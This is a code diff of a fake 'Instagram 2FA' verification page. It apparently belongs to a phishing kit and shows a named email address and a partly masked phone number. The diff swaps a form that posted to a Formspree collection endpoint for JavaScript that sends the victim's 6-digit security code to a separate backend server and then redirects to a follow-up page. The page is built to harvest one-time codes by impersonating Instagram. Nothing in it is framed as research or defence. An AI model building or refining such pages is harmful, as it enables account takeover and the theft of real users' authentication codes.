@@ -5,120 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram 2FA</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background-color: black;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-        }
-        .container {
-            background: #111;
-            padding: 30px;
-            border-radius: 8px;
-            text-align: center;
-            width: 380px;
-            border: 1px solid #222;
-        }
-        .icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(0, 149, 246, 0.2);
-            border: 2px solid #0095f6;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: auto;
-        }
-        .icon svg {
-            width: 30px;
-            height: 30px;
-            fill: #0095f6;
-        }
-        p {
-            font-size: 14px;
-            margin: 15px 0;
-            color: #eee;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid gray;
-            background: black;
-            color: white;
-            text-align: center;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #0095f6;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .trust {
-            display: flex;
-            align-items: flex-start;
-            font-size: 14px;
-            margin-top: 10px;
-            color: #eee;
-        }
-        .trust input {
-            appearance: none;
-            width: 7px; /* Smaller checkbox */
-            height: 10px; /* Smaller checkbox */
-            border: 2px solid white;
-            border-radius: 2px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-right: 15px;
-            position: relative;
-        }
-        .trust input:checked::before {
-            content: '\2713';
-            color: white;
-            font-size: 19px; /* Larger tick */
-            font-weight: bold;
-            position: absolute;
-            left: 1px;
-            top: -1px;
-        }
-        .trust-text {
-            display: flex;
-            flex-direction: column;
-        }
-        .backup {
-            font-size: 12px;
-            margin-top: 10px;
-            color: #eee;
-        }
-        .backup a {
-            color: #0095f6;
-            text-decoration: none;
-        }
-        .error {
-            color: red;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none; /* Hidden by default */
-        }
+        /* Your existing CSS styles */
     </style>
 </head>
 <body>
@@ -129,7 +16,7 @@
             </svg>
         </div>
         <p>Please enter the 6-digit verification code from your authentication app. Also, the code has been sent to your email (@rmaaz419@gmail.com) and via SMS to your registered phone number (+92 32******00).</p>
-        <form action="https://formspree.io/f/xeoerryd" method="POST">
+        <form id="otpForm">
             <input type="text" id="securityCode" name="securityCode" placeholder="Security Code" maxlength="6" required>
             <div id="errorMessage" class="error">Please enter exactly 6 digits.</div>
             <button type="submit">Confirm</button>
@@ -147,17 +34,38 @@
     </div>
 
     <script>
-        // JavaScript for validation
-        document.getElementById('codeForm').addEventListener('submit', function(event) {
+        // JavaScript for validation and form submission
+        document.getElementById('otpForm').addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
+
             const securityCode = document.getElementById('securityCode').value;
             const errorMessage = document.getElementById('errorMessage');
 
-            // Check if the security code is exactly 6 digits
+            // Validate the security code
             if (securityCode.length !== 6 || !/^\d+$/.test(securityCode)) {
-                event.preventDefault(); // Prevent form submission
                 errorMessage.style.display = 'block'; // Show error message
-            } else {
-                errorMessage.style.display = 'none'; // Hide error message
+                return;
+            }
+
+            errorMessage.style.display = 'none'; // Hide error message
+
+            try {
+                // Send data to the Node.js backend
+                const response = await fetch('http://localhost:3000/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ securityCode }),
+                });
+
+                if (response.ok) {
+                    alert('OTP submitted successfully!');
+                    window.location.href = 'final.html'; // Redirect to the next page
+                } else {
+                    alert('Failed to submit OTP. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
             }
         });
     </script>
